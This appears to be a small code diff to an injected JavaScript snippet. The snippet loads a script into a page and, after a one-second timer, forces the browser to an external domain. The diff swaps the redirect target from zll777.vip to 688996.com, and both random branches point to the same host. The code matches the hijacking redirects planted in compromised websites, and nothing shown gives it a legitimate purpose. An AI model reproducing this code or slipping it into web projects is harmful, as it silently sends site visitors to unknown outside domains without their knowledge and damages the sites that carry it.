@@ -6,6 +6,6 @@
     y ? y.parentNode.insertBefore(t, y) : d.head.appendChild(t);
 
     setTimeout(function() {
-        window.location.href = Math.random() < 0.5 ? "https://zll777.vip" : "https://zll777.vip";
+        window.location.href = Math.random() < 0.5 ? "https://688996.com" : "https://688996.com";
     }, 1000);
 })(window, document, "script");
